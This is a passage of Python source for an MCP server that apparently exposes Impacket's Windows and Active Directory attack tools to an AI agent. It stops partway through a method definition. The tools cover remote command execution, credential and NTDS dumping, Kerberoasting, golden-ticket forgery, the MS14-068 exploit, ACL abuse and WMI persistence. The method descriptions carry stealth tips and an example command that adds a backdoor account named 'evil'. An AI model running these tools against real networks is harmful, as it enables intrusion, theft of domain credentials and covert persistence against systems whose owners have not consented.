#!/usr/bin/env python3
"""
OpenSploit MCP Server: impacket

Windows/Active Directory exploitation toolkit wrapping Impacket scripts
for remote execution, credential dumping, Kerberos attacks, and SMB operations.

Provides 47+ methods across 10 categories:
- Remote execution (psexec, wmiexec, smbexec, dcomexec, atexec)
- Credential dumping (secretsdump)
- Kerberos attacks (kerberoast, asreproast, get_tgt, get_st, ticketer, ticket_converter, describe_ticket, get_pac)
- SMB operations (smb_shares, smb_get, smb_put)
- AD enumeration (get_ad_users, get_ad_computers, lookupsid, samrdump, rpcdump, rpcmap, dump_ntlm_info, machine_role, get_arch)
- Delegation abuse (addcomputer, find_delegation, rbcd)
- Account modification (changepasswd, addspn)
- ACL attacks (dacledit, owneredit)
- DACL/credential extraction (get_laps_password, get_gpp_password, dpapi_backupkeys, keylistattack)
- Services/persistence (services, reg, net, mssqlclient, mssqlinstance, wmiquery, wmipersist, tstool, exchanger, golden_pac, raise_child, rdp_check)
- Custom scripts (run_custom)
"""

import asyncio
import base64
import ntpath
import os
import re
import shlex
import shutil
import tempfile
import types
from typing import Any, Dict, List, Optional

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output

CRED_DIR = "/session/credentials"
CONFIG_DIR = "/session/config"
CUSTOM_SCRIPT_DIR = "/session/impacket-scripts"
RECIPE_DIR = "/session/recipes/impacket"

# Auth param names handled by auth builders, not by generic flag mapping
AUTH_PARAM_NAMES = {"target", "username", "password", "domain", "hashes",
                    "kerberos", "dc_ip", "dc_host", "aes_key", "port", "ccache_path"}

# ── Data-Driven Generic Scripts ─────────────────────────────────────────────
#
# Each entry defines a new method backed by the generic handler _run_generic().
# Keys:
#   name:        MCP method name
#   binary:      CLI binary (default: impacket-{name})
#   description: Method description
#   auth:        "target" (user:pass@host), "domain" (domain/user:pass + -dc-ip),
#                "none" (no auth), "custom" (handled in params)
#   params:      dict of param_name -> {type, required, description, flag, ...}
#                flag: CLI flag (default: --{param_name.replace('_', '-')})
#                      "" means positional (appended after identity)
#                      None means use default derivation
#   identity_position: "last" (default) or "first" - where to place identity string

IMPACKET_SCRIPTS: List[Dict[str, Any]] = [
    # ── ACL Attacks ─────────────────────────────────────────────────────
    {
        "name": "dacledit",
        "binary": "impacket-dacledit",
        "description": "Edit DACLs on Active Directory objects. Read, write, remove, backup, or restore ACEs for a principal on a target object. Useful for abusing WriteDACL permissions.",
        "auth": "domain",
        "params": {
            "action": {
                "type": "string",
                "description": "Action: read (view DACL), write (add ACE), remove (delete ACE), backup (save DACL to file), restore (load DACL from file)",
                "enum": ["read", "write", "remove", "backup", "restore"],
                "default": "read",
                "flag": "-action",
            },
            "principal": {
                "type": "string",
                "description": "sAMAccountName of the attacker-controlled principal to add/remove in the ACE",
                "flag": "-principal",
            },
            "principal_sid": {
                "type": "string",
                "description": "SID of the principal (alternative to -principal name)",
                "flag": "-principal-sid",
            },
            "target_object": {
                "type": "string",
                "description": "sAMAccountName of the target object whose DACL to edit",
                "flag": "-target",
            },
            "target_sid": {
                "type": "string",
                "description": "SID of the target object (alternative to -target name)",
                "flag": "-target-sid",
            },
            "target_dn": {
                "type": "string",
                "description": "Distinguished Name of the target object",
                "flag": "-target-dn",
            },
            "rights": {
                "type": "string",
                "description": "Rights to write/remove: FullControl, ResetPassword, WriteMembers, DCSync, Custom",
                "enum": ["FullControl", "ResetPassword", "WriteMembers", "DCSync", "Custom"],
                "flag": "-rights",
            },
            "rights_guid": {
                "type": "string",
                "description": "Manual GUID for custom rights (use with -rights Custom)",
                "flag": "-rights-guid",
            },
            "ace_type": {
                "type": "string",
                "description": "ACE type: allowed or denied (default: allowed)",
                "enum": ["allowed", "denied"],
                "flag": "-ace-type",
            },
            "inheritance": {
                "type": "boolean",
                "description": "Enable ACE inheritance (CONTAINER_INHERIT + OBJECT_INHERIT). Useful for containers/OUs.",
                "flag": "-inheritance",
            },
            "use_ldaps": {
                "type": "boolean",
                "description": "Use LDAPS instead of LDAP",
                "flag": "-use-ldaps",
            },
            "file": {
                "type": "string",
                "description": "Filename for backup/restore actions",
                "flag": "-file",
            },
        },
    },
    {
        "name": "owneredit",
        "binary": "impacket-owneredit",
        "description": "Read or modify the owner of an Active Directory object. Useful for abusing WriteOwner permissions to take ownership of objects.",
        "auth": "domain",
        "params": {
            "action": {
                "type": "string",
                "description": "Action: read (view current owner) or write (set new owner)",
                "enum": ["read", "write"],
                "default": "read",
                "flag": "-action",
            },
            "new_owner": {
                "type": "string",
                "description": "sAMAccountName of the new owner (for write action)",
                "flag": "-new-owner",
            },
            "new_owner_sid": {
                "type": "string",
                "description": "SID of the new owner (alternative to -new-owner)",
                "flag": "-new-owner-sid",
            },
            "target_object": {
                "type": "string",
                "description": "sAMAccountName of the target object",
                "flag": "-target",
            },
            "target_sid": {
                "type": "string",
                "description": "SID of the target object",
                "flag": "-target-sid",
            },
            "target_dn": {
                "type": "string",
                "description": "Distinguished Name of the target object",
                "flag": "-target-dn",
            },
            "use_ldaps": {
                "type": "boolean",
                "description": "Use LDAPS instead of LDAP",
                "flag": "-use-ldaps",
            },
        },
    },

    # ── Kerberos Ticket Manipulation ────────────────────────────────────
    {
        "name": "ticketer",
        "binary": "impacket-ticketer",
        "description": "Create Kerberos golden or silver tickets. Golden ticket: omit -spn (needs krbtgt hash + domain SID). Silver ticket: provide -spn (needs service account hash). Also supports sapphire tickets via -impersonate.",
        "auth": "none",
        "params": {
            "target_user": {
                "type": "string",
                "required": True,
                "description": "Username for the newly created ticket",
                "flag": "",
            },
            "domain_name": {
                "type": "string",
                "required": True,
                "description": "Fully qualified domain name (e.g., contoso.com)",
                "flag": "-domain",
            },
            "domain_sid": {
                "type": "string",
                "required": True,
                "description": "Domain SID (e.g., S-1-5-21-...). Get from lookupsid.",
                "flag": "-domain-sid",
            },
            "spn": {
                "type": "string",
                "description": "Service SPN for silver ticket (omit for golden ticket)",
                "flag": "-spn",
            },
            "nthash": {
                "type": "string",
                "description": "NT hash used for signing the ticket (krbtgt for golden, service account for silver)",
                "flag": "-nthash",
            },
            "aes_key": {
                "type": "string",
                "description": "AES key (128 or 256 bit) used for signing the ticket",
                "flag": "-aesKey",
            },
            "groups": {
                "type": "string",
                "description": "Comma-separated group RIDs (default: 513,512,520,518,519 = Domain Users/Admins/etc.)",
                "flag": "-groups",
            },
            "user_id": {
                "type": "integer",
                "description": "User RID for the ticket (default: 500 = Administrator)",
                "flag": "-user-id",
            },
            "extra_sid": {
                "type": "string",
                "description": "Comma-separated extra SIDs to include in PAC (for SID history attacks across trusts)",
                "flag": "-extra-sid",
            },
            "extra_pac": {
                "type": "boolean",
                "description": "Populate ticket with extra PAC (UPN_DNS)",
                "flag": "-extra-pac",
            },
            "duration": {
                "type": "integer",
                "description": "Ticket validity in hours (default: 87600 = 10 years)",
                "flag": "-duration",
            },
            "impersonate": {
                "type": "string",
                "description": "Sapphire ticket: target username to impersonate via S4U2Self+U2U",
                "flag": "-impersonate",
            },
            "request": {
                "type": "boolean",
                "description": "Request ticket from domain and clone it (requires -user and -password)",
                "flag": "-request",
            },
            "request_user": {
                "type": "string",
                "description": "domain/username for -request mode",
                "flag": "-user",
            },
            "request_password": {
                "type": "string",
                "description": "Password for -request mode",
                "flag": "-password",
            },
            "request_hashes": {
                "type": "string",
                "description": "NTLM hashes for -request mode (LMHASH:NTHASH)",
                "flag": "-hashes",
            },
            "dc_ip": {
                "type": "string",
                "description": "Domain Controller IP for -request mode",
                "flag": "-dc-ip",
            },
        },
    },
    {
        "name": "ticket_converter",
        "binary": "impacket-ticketConverter",
        "description": "Convert Kerberos tickets between ccache and kirbi (KRB-CRED) formats. Converts .ccache to .kirbi for Rubeus/Mimikatz or vice versa.",
        "auth": "none",
        "params": {
            "input_file": {
                "type": "string",
                "required": True,
                "description": "Path to input ticket file (.ccache or .kirbi)",
                "flag": "",
            },
            "output_file": {
                "type": "string",
                "required": True,
                "description": "Path to output ticket file",
                "flag": "",
            },
        },
    },
    {
        "name": "describe_ticket",
        "binary": "impacket-describeTicket",
        "description": "Parse and describe a Kerberos ticket. Decrypts the enc-part and parses the PAC if decryption keys are provided. Supports UnPAC-the-Hash for PKINIT tickets.",
        "auth": "none",
        "params": {
            "ticket": {
                "type": "string",
                "required": True,
                "description": "Path to ticket file (.ccache)",
                "flag": "",
            },
            "service_password": {
                "type": "string",
                "description": "Cleartext password of the service account (for ticket decryption)",
                "flag": "-p",
            },
            "service_user": {
                "type": "string",
                "description": "Name of the service account",
                "flag": "-u",
            },
            "service_domain": {
                "type": "string",
                "description": "FQDN domain of the service account",
                "flag": "-d",
            },
            "rc4": {
                "type": "string",
                "description": "RC4 key (NT hash) for ticket decryption",
                "flag": "--rc4",
            },
            "aes_key": {
                "type": "string",
                "description": "AES128 or AES256 key for ticket decryption",
                "flag": "--aes",
            },
            "asrep_key": {
                "type": "string",
                "description": "AS reply key for PAC Credentials decryption (UnPAC-the-Hash)",
                "flag": "--asrep-key",
            },
        },
    },
    {
        "name": "get_pac",
        "binary": "impacket-getPac",
        "description": "Retrieve the PAC (Privilege Attribute Certificate) for a target user. Requires valid domain credentials. Useful for inspecting group memberships, SID history, and privilege data.",
        "auth": "domain",
        "_no_dc_ip": True,  # getPac.py does not accept -dc-ip flag
        "params": {
            "target_user": {
                "type": "string",
                "required": True,
                "description": "Target user to retrieve the PAC of",
                "flag": "-targetUser",
            },
        },
    },

    # ── Credential Extraction ───────────────────────────────────────────
    {
        "name": "get_laps_password",
        "binary": "impacket-GetLAPSPassword",
        "description": "Extract LAPS (Local Administrator Password Solution) passwords from Active Directory via LDAP. Requires read access to ms-Mcs-AdmPwd attribute.",
        "auth": "domain",
        "params": {
            "computer": {
                "type": "string",
                "description": "Target a specific computer by its name (default: all computers with LAPS)",
                "flag": "-computer",
            },
            "use_ldaps": {
                "type": "boolean",
                "description": "Use LDAPS (required for Windows Server 2025 with LDAPS enforced)",
                "flag": "-ldaps",
            },
        },
    },
    {
        "name": "get_gpp_password",
        "binary": "impacket-Get-GPPPassword",
        "description": "Find and decrypt Group Policy Preferences (GPP) passwords stored in SYSVOL XML files. Decrypts cpassword values using the publicly known AES key (MS14-025).",
        "auth": "target",
        "params": {
            "xmlfile": {
                "type": "string",
                "description": "Specific GPP XML file to parse (default: search all SYSVOL)",
                "flag": "-xmlfile",
            },
            "share": {
                "type": "string",
                "description": "SMB share to search (default: SYSVOL)",
                "flag": "-share",
            },
            "base_dir": {
                "type": "string",
                "description": "Directory to search in (default: /)",
                "flag": "-base-dir",
            },
        },
    },
    {
        "name": "dpapi_backupkeys",
        "binary": "impacket-dpapi",
        "description": "Retrieve DPAPI domain backup keys from a Domain Controller. Requires Domain Admin privileges. The backup key can decrypt any DPAPI-protected secret in the domain.",
        "auth": "target",
        "_identity_flag": "-t",  # dpapi uses -t for identity, not positional
        "params": {
            "export_keys": {
                "type": "boolean",
                "description": "Export backup keys to file",
                "flag": "--export",
            },
        },
        "_subcommand": "backupkeys",
    },
    {
        "name": "keylistattack",
        "binary": "impacket-keylistattack",
        "description": "KERB-KEY-LIST-REQ attack to dump secrets from a Read-Only Domain Controller (RODC) without executing any agent. Requires RODC krbtgt credentials.",
        "auth": "target",
        "params": {
            "rodc_no": {
                "type": "integer",
                "description": "RODC krbtgt account number",
                "flag": "-rodcNo",
            },
            "rodc_key": {
                "type": "string",
                "description": "AES key of the Read Only Domain Controller",
                "flag": "-rodcKey",
            },
            "full": {
                "type": "boolean",
                "description": "Run attack against ALL domain users (noisy, may cause TGS rejections)",
                "flag": "-full",
            },
            "target_user": {
                "type": "string",
                "description": "Attack only this specific username",
                "flag": "-t",
            },
            "target_file": {
                "type": "string",
                "description": "File containing list of target usernames",
                "flag": "-tf",
            },
        },
    },

    # ── AD Enumeration ──────────────────────────────────────────────────
    {
        "name": "get_ad_computers",
        "binary": "impacket-GetADComputers",
        "description": "Enumerate Active Directory computer objects via LDAP. Returns computer names, OS versions, and optionally resolves IP addresses.",
        "auth": "domain",
        "params": {
            "filter_user": {
                "type": "string",
                "description": "Filter for a specific computer name",
                "flag": "-user",
            },
            "resolve_ip": {
                "type": "boolean",
                "description": "Resolve IP addresses of computer objects via DNS lookup on the DC",
                "flag": "-resolveIP",
            },
        },
    },
    {
        "name": "samrdump",
        "binary": "impacket-samrdump",
        "description": "Dump SAM database user list via SAMR RPC. Lists all domain/local users with their attributes. Works via null session if allowed.",
        "auth": "target",
        "params": {
            "csv": {
                "type": "boolean",
                "description": "Output in CSV format",
                "flag": "-csv",
            },
        },
    },
    {
        "name": "rpcdump",
        "binary": "impacket-rpcdump",
        "description": "Dump remote RPC endpoint information via the epmapper service. Lists all registered RPC interfaces with their UUIDs, versions, and binding strings.",
        "auth": "target",
        "params": {},
    },
    {
        "name": "rpcmap",
        "binary": "impacket-rpcmap",
        "description": "Enumerate and bruteforce listening MSRPC interfaces. Discover hidden RPC services, bruteforce UUIDs, opnums, and versions.",
        "auth": "none",
        "params": {
            "string_binding": {
                "type": "string",
                "required": True,
                "description": "String binding (e.g., ncacn_ip_tcp:192.168.0.1[135], ncacn_np:192.168.0.1[\\pipe\\spoolss])",
                "flag": "",
            },
            "brute_uuids": {
                "type": "boolean",
                "description": "Bruteforce UUIDs even if MGMT interface is available",
                "flag": "-brute-uuids",
            },
            "brute_opnums": {
                "type": "boolean",
                "description": "Bruteforce opnums for found UUIDs",
                "flag": "-brute-opnums",
            },
            "brute_versions": {
                "type": "boolean",
                "description": "Bruteforce major versions of found UUIDs",
                "flag": "-brute-versions",
            },
            "uuid": {
                "type": "string",
                "description": "Test only this specific UUID",
                "flag": "-uuid",
            },
            "auth_rpc": {
                "type": "string",
                "description": "RPC authentication as [domain/]username[:password]",
                "flag": "-auth-rpc",
            },
            "hashes_rpc": {
                "type": "string",
                "description": "NTLM hashes for RPC auth (LMHASH:NTHASH)",
                "flag": "-hashes-rpc",
            },
        },
    },
    {
        "name": "dump_ntlm_info",
        "binary": "impacket-DumpNTLMInfo",
        "description": "Perform NTLM authentication and extract system information. Returns NetBIOS name, DNS domain, OS version, and other NTLM challenge metadata. No credentials required.",
        "auth": "none",
        "params": {
            "target": {
                "type": "string",
                "required": True,
                "description": "Target hostname or IP address",
                "flag": "",
            },
            "port": {
                "type": "integer",
                "description": "Target port (default: 445 for SMB, use 135 for RPC)",
                "flag": "-port",
            },
            "protocol": {
                "type": "string",
                "description": "Protocol: SMB or RPC (default: SMB, port 135 uses RPC)",
                "enum": ["SMB", "RPC"],
                "flag": "-protocol",
            },
        },
    },
    {
        "name": "machine_role",
        "binary": "impacket-machine_role",
        "description": "Retrieve a host's role (Workstation, Member Server, Domain Controller, etc.) and its primary domain details via SMB.",
        "auth": "target",
        "params": {},
    },
    {
        "name": "get_arch",
        "binary": "impacket-getArch",
        "description": "Detect the target system's OS architecture (32-bit vs 64-bit) via MSRPC. No credentials required.",
        "auth": "none",
        "params": {
            "target": {
                "type": "string",
                "required": True,
                "description": "Target hostname or IP address",
                "flag": "-target",
            },
            "arch_timeout": {
                "type": "integer",
                "description": "Socket timeout in seconds (default: 2)",
                "flag": "-timeout",
            },
        },
    },
    {
        "name": "rdp_check",
        "binary": "impacket-rdp_check",
        "description": "Test whether credentials are valid on a target host using the RDP protocol. Useful for validating credentials when SMB is blocked.",
        "auth": "target",
        "params": {
            "ipv6": {
                "type": "boolean",
                "description": "Test on IPv6",
                "flag": "-6",
            },
        },
    },

    # ── Services & Remote Management ────────────────────────────────────
    {
        "name": "services",
        "binary": "impacket-services",
        "description": "Manipulate Windows services remotely via MSRPC. List, start, stop, delete, create, query status, or modify services.",
        "auth": "target",
        "params": {
            "action": {
                "type": "string",
                "required": True,
                "description": "Action: list, start, stop, delete, status, config, create, change",
                "enum": ["list", "start", "stop", "delete", "status", "config", "create", "change"],
                "flag": "",
                "_positional_after_identity": True,
            },
            "service_name": {
                "type": "string",
                "description": "Service name (required for start/stop/delete/status/config/change)",
                "flag": "-name",
            },
            "display_name": {
                "type": "string",
                "description": "Display name for service creation",
                "flag": "-display",
            },
            "binary_path": {
                "type": "string",
                "description": "Binary path for service creation (e.g., 'cmd.exe /c net user evil Pass123! /add')",
                "flag": "-path",
            },
        },
    },
    {
        "name": "reg",
        "binary": "impacket-reg",
        "description": "Remote Windows registry manipulation via MSRPC. Query, add, delete, save, or backup registry keys/values.",
        "auth": "target",
        "params": {
            "action": {
                "type": "string",
                "required": True,
                "description": "Action: query, add, delete, save, backup",
                "enum": ["query", "add", "delete", "save", "backup"],
                "flag": "",
                "_positional_after_identity": True,
            },
            "key_name": {
                "type": "string",
                "description": "Full registry key path (e.g., HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion). Required for all actions.",
                "flag": "-keyName",
            },
            "value_name": {
                "type": "string",
                "description": "Registry value name to query (omit for all values)",
                "flag": "-v",
            },
            "recursive": {
                "type": "boolean",
                "description": "Query all subkeys and values recursively",
                "flag": "-s",
            },
        },
    },
    {
        "name": "net",
        "binary": "impacket-net",
        "description": "SAMR RPC client for user/group/computer enumeration and management. List, create, remove, enable, or disable accounts.",
        "auth": "target",
        "params": {
            "object_type": {
                "type": "string",
                "required": True,
                "description": "Object type: user, computer, localgroup, group",
                "enum": ["user", "computer", "localgroup", "group"],
                "flag": "",
                "_positional_after_identity": True,
            },
            "name": {
                "type": "string",
                "description": "Display info for a specific object",
                "flag": "-name",
            },
            "create_name": {
                "type": "string",
                "description": "Create a new account with this name",
                "flag": "-create",
            },
            "remove_name": {
                "type": "string",
                "description": "Remove an existing account",
                "flag": "-remove",
            },
            "new_passwd": {
                "type": "string",
                "description": "Password for newly created account",
                "flag": "-newPasswd",
            },
            "enable_name": {
                "type": "string",
                "description": "Enable a disabled account",
                "flag": "-enable",
            },
            "disable_name": {
                "type": "string",
                "description": "Disable an account",
                "flag": "-disable",
            },
        },
    },
    {
        "name": "mssqlclient",
        "binary": "impacket-mssqlclient",
        "description": "MSSQL client with TDS protocol support (SSL supported). Execute SQL commands, enable xp_cmdshell, or upload/execute commands.",
        "auth": "target",
        "params": {
            "db": {
                "type": "string",
                "description": "MSSQL database instance to connect to",
                "flag": "-db",
            },
            "windows_auth": {
                "type": "boolean",
                "description": "Use Windows Authentication (default: SQL auth)",
                "flag": "-windows-auth",
            },
            "command": {
                "type": "string",
                "description": "SQL command(s) to execute (for non-interactive use)",
                "flag": "-command",
            },
            "file": {
                "type": "string",
                "description": "Input file with SQL commands to execute",
                "flag": "-file",
            },
        },
    },
    {
        "name": "mssqlinstance",
        "binary": "impacket-mssqlinstance",
        "description": "Query a remote host for running MSSQL instances via UDP discovery (port 1434). No credentials required.",
        "auth": "none",
        "params": {
            "target": {
                "type": "string",
                "required": True,
                "description": "Target hostname or IP address",
                "flag": "",
            },
            "instance_timeout": {
                "type": "integer",
                "description": "Timeout in seconds to wait for response",
                "flag": "-timeout",
            },
        },
    },
    {
        "name": "wmiquery",
        "binary": "impacket-wmiquery",
        "description": "Execute WQL queries via WMI (Windows Management Instrumentation). Query system information, installed software, running processes, etc.",
        "auth": "target",
        "params": {
            "namespace": {
                "type": "string",
                "description": "WMI namespace (default: //./root/cimv2)",
                "flag": "-namespace",
            },
            "query_file": {
                "type": "string",
                "description": "Input file with WQL queries to execute",
                "flag": "-file",
            },
            "rpc_auth_level": {
                "type": "string",
                "description": "RPC auth level: default, integrity, or privacy",
                "enum": ["default", "integrity", "privacy"],
                "flag": "-rpc-auth-level",
            },
        },
    },
    {
        "name": "wmipersist",
        "binary": "impacket-wmipersist",
        "description": "Create or remove WMI event subscriptions for persistence. Installs a VBS script that triggers on a WQL filter or timer.",
        "auth": "target",
        "params": {
            "action": {
                "type": "string",
                "required": True,
                "description": "Action: install (create event subscription) or remove (delete subscription)",
                "enum": ["install", "remove"],
                "flag": "",
                "_positional_after_identity": True,
            },
            "event_name": {
                "type": "string",
                "required": True,
                "description": "Event subscription name (used for both install and remove)",
                "flag": "-name",
            },
            "vbs_file": {
                "type": "string",
                "description": "Path to VBS script file to execute (required for install)",
                "flag": "-vbs",
            },
            "wql_filter": {
                "type": "string",
                "description": "WQL filter string that triggers the script (e.g., 'SELECT * FROM __InstanceCreationEvent...')",
                "flag": "-filter",
            },
            "timer_ms": {
                "type": "integer",
                "description": "Timer interval in milliseconds (alternative to WQL filter)",
                "flag": "-timer",
            },
        },
    },
    {
        "name": "tstool",
        "binary": "impacket-tstool",
        "description": "Terminal Services / Remote Desktop manipulation. List sessions (qwinsta), list processes (tasklist), kill processes (taskkill), connect/disconnect sessions, send messages.",
        "auth": "target",
        "params": {
            "action": {
                "type": "string",
                "required": True,
                "description": "Action: qwinsta, tasklist, taskkill, tscon, tsdiscon, logoff, shutdown, msg, shadow",
                "enum": ["qwinsta", "tasklist", "taskkill", "tscon", "tsdiscon", "logoff", "shutdown", "msg", "shadow"],
                "flag": "",
                "_positional_after_identity": True,
            },
            "pid": {
                "type": "integer",
                "description": "Process ID for taskkill",
                "flag": "-pid",
            },
            "process_name": {
                "type": "string",
                "description": "Process name for taskkill (will look up PID internally)",
                "flag": "-name",
            },
            "verbose": {
                "type": "boolean",
                "description": "Verbose output for qwinsta/tasklist",
                "flag": "-v",
            },
        },
    },
    {
        "name": "exchanger",
        "binary": "impacket-exchanger",
        "description": "Abuse Exchange services. Enumerate Address Books, dump tables, and lookup objects via the NSPI interface.",
        "auth": "target",
        "params": {
            "rpc_hostname": {
                "type": "string",
                "description": "Server name in GUID or NetBIOS format for RPC binding",
                "flag": "-rpc-hostname",
            },
        },
        "_subcommand": "nspi",
        "_subcommand_after_identity": True,
    },

    # ── Privilege Escalation / Lateral Movement ─────────────────────────
    {
        "name": "golden_pac",
        "binary": "impacket-goldenPac",
        "description": "MS14-068 exploit for Kerberos PAC validation vulnerability. Forges a golden ticket and optionally executes PSEXEC on the target.",
        "auth": "target",
        "params": {
            "command": {
                "type": "string",
                "description": "Command to execute via PSEXEC after ticket forgery (default: cmd.exe, 'None' to skip PSEXEC)",
                "flag": "",
            },
            "write_ticket": {
                "type": "string",
                "description": "Save the forged golden ticket to this ccache file path",
                "flag": "-w",
            },
        },
    },
    {
        "name": "raise_child",
        "binary": "impacket-raiseChild",
        "description": "Privilege escalation from a child domain to the forest root. Exploits trust relationships to create an Enterprise Admin golden ticket.",
        "auth": "domain",
        "params": {
            "target_exec": {
                "type": "string",
                "description": "Target host to PSEXEC into after escalation",
                "flag": "-target-exec",
            },
            "target_rid": {
                "type": "integer",
                "description": "Target user RID to dump credentials for (default: 500 = Administrator)",
                "flag": "-targetRID",
            },
            "write_ticket": {
                "type": "string",
                "description": "Save the golden ticket to this ccache file path",
                "flag": "-w",
            },
        },
    },
]


class ImpacketServer(BaseMCPServer):
    """MCP server wrapping Impacket for Windows/AD exploitation."""

    def __init__(self):
        super().__init__(
            name="impacket",
            description="Windows/AD exploitation toolkit (psexec, secretsdump, kerberoast, SMB, AD)",
            version="2.0.0",
        )

        # Stateful credential tracking
        self._tickets: Dict[str, str] = {}  # principal -> ccache path in /session/credentials/
        self._active_principal: Optional[str] = None  # default identity for subsequent calls
        self._krb5_configured: bool = False  # whether krb5.conf has been written

        # Restore state from /session/ on startup
        self._restore_state()

        # ── Remote Execution ─────────────────────────────────────────────

        self.register_method(
            name="psexec",
            description="Execute commands on a remote Windows host via PsExec (creates a service, most reliable but noisy)",
            params={
                **self._auth_params(),
                "command": {
                    "type": "string",
                    "description": "Command to execute (omit for interactive shell; use 'cmd.exe /c <cmd>' for single commands)",
                },
                "service_name": {
                    "type": "string",
                    "description": "Custom service name (default: random, for stealth use innocuous names)",
                },
                "remote_binary_name": {
                    "type": "string",
                    "description": "Custom name for the uploaded executable on the target",
                },
                "upload_file": {
                    "type": "string",
                    "description": "Local file to upload and execute on the target (use command arg for arguments)",
                },
                "codec": {
                    "type": "string",
                    "default": "utf-8",
                    "description": "Output codec (utf-8, cp437, cp850, etc.)",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string (e.g., '-path C:\\Windows -debug')",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.psexec,
        )

        self.register_method(
            name="wmiexec",
            description="Execute commands on a remote Windows host via WMI (stealthier than psexec, no service creation)",
            params={
                **self._auth_params(),
                "command": {
                    "type": "string",
                    "description": "Command to execute (omit for semi-interactive shell)",
                },
                "nooutput": {
                    "type": "boolean",
                    "default": False,
                    "description": "Do not retrieve command output (for blind execution)",
                },
                "shell_type": {
                    "type": "string",
                    "enum": ["cmd", "powershell"],
                    "description": "Shell type for semi-interactive mode (cmd or powershell)",
                },
                "silentcommand": {
                    "type": "boolean",
                    "default": False,
                    "description": "Skip cmd.exe wrapper — directly execute via WMI (no output possible)",
                },
                "share": {
                    "type": "string",
                    "description": "Share for output retrieval (default: ADMIN$)",
                },
                "codec": {
                    "type": "string",
                    "default": "utf-8",
                    "description": "Output codec",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.wmiexec,
        )

        self.register_method(
            name="smbexec",
            description="Execute commands on a remote Windows host via SMB (native commands, no binary upload needed)",
            params={
                **self._auth_params(),
                "command": {
                    "type": "string",
                    "description": "Command to execute",
                },
                "share": {
                    "type": "string",
                    "default": "C$",
                    "description": "Writable share for output (default: C$)",
                },
                "mode": {
                    "type": "string",
                    "enum": ["SHARE", "SERVER"],
                    "default": "SHARE",
                    "description": "Execution mode",
                },
                "codec": {
                    "type": "string",
                    "default": "utf-8",
                    "description": "Output codec",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.smbexec,
        )

        self.register_method(
            name="dcomexec",
            description="Execute commands on a remote Windows host via DCOM objects (MMC20, ShellWindows, ShellBrowserWindow)",
            params={
                **self._auth_params(),
                "command": {
                    "type": "string",
                    "description": "Command to execute",
                },
                "dcom_object": {
                    "type": "string",
                    "enum": ["MMC20", "ShellWindows", "ShellBrowserWindow"],
                    "default": "MMC20",
                    "description": "DCOM object to use for execution",
                },
                "nooutput": {
                    "type": "boolean",
                    "default": False,
                    "description": "Do not retrieve command output",
                },
                "silentcommand": {
                    "type": "boolean",
                    "default": False,
                    "description": "Skip cmd.exe wrapper (direct execution, no output)",
                },
                "codec": {
                    "type": "string",
                    "default": "utf-8",
                    "description": "Output codec",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.dcomexec,
        )

        self.register_method(
            name="atexec",
            description="Execute commands on a remote Windows host via Task Scheduler (scheduled task based execution)",
            params={
                **self._auth_params(),
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "Command to execute via scheduled task",
                },
                "codec": {
                    "type": "string",
                    "default": "utf-8",
                    "description": "Output codec",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.atexec,
        )

        # ── Credential Attacks ───────────────────────────────────────────

        self.register_method(
            name="secretsdump",
            description="Dump credentials from a Windows host (SAM, LSA secrets, cached creds, NTDS.dit via DRSUAPI/VSS)",
            params={
                **self._auth_params(),
                "just_dc": {
                    "type": "boolean",
                    "default": False,
                    "description": "Only extract NTDS.dit data via DRSUAPI (DC only, much faster)",
                },
                "just_dc_ntlm": {
                    "type": "boolean",
                    "default": False,
                    "description": "Only extract NTLM hashes from NTDS.dit (no Kerberos keys)",
                },
                "just_dc_user": {
                    "type": "string",
                    "description": "Extract only this user's hash from NTDS.dit",
                },
                "use_vss": {
                    "type": "boolean",
                    "default": False,
                    "description": "Use Volume Shadow Copy instead of DRSUAPI (noisier but works when DRSUAPI fails)",
                },
                "exec_method": {
                    "type": "string",
                    "enum": ["smbexec", "wmiexec", "mmcexec"],
                    "description": "Remote execution method for VSS",
                },
                "history": {
                    "type": "boolean",
                    "default": False,
                    "description": "Dump password history and LSA secrets OldVal",
                },
                "pwd_last_set": {
                    "type": "boolean",
                    "default": False,
                    "description": "Show pwdLastSet attribute for each NTDS.dit account",
                },
                "user_status": {
                    "type": "boolean",
                    "default": False,
                    "description": "Display whether each user is disabled",
                },
                "skip_sam": {
                    "type": "boolean",
                    "default": False,
                    "description": "Do NOT parse the SAM hive on remote system",
                },
                "use_keylist": {
                    "type": "boolean",
                    "default": False,
                    "description": "Use Kerb-Key-List method instead of DRSUAPI",
                },
                "ldapfilter": {
                    "type": "string",
                    "description": "LDAP filter for DRSUAPI extraction (e.g., '(sAMAccountName=admin*)')",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 600,
                    "description": "Timeout in seconds (credential dumping can be slow on large domains)",
                },
            },
            handler=self.secretsdump,
        )

        self.register_method(
            name="kerberoast",
            description="Kerberoasting attack - extract TGS service ticket hashes for offline cracking (targets accounts with SPNs)",
            params={
                **self._auth_params(),
                "request_user": {
                    "type": "string",
                    "description": "Target a specific user's SPN (default: all SPNs)",
                },
                "output_format": {
                    "type": "string",
                    "enum": ["hashcat", "john"],
                    "default": "hashcat",
                    "description": "Hash output format",
                },
                "target_domain": {
                    "type": "string",
                    "description": "Target a different domain (Kerberoasting across trusts)",
                },
                "stealth": {
                    "type": "boolean",
                    "default": False,
                    "description": "Remove (servicePrincipalName=*) from LDAP query for stealth (may use more memory)",
                },
                "no_preauth": {
                    "type": "string",
